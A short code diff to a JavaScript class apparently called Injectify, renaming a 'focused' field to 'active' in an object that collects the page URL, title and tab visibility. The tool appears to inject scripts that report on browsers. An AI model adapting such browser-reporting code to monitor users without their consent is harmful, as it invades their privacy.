@@ -242,7 +242,7 @@ window['injectify'] = class Injectify {
 			'window': {
 				'url': window.location.href,
 				'title': document.title ? document.title : window.location.host + window.location.pathname,
-				'focused': !document[hidden],
+				'active': !document[hidden],
 			}
 		}
 	}
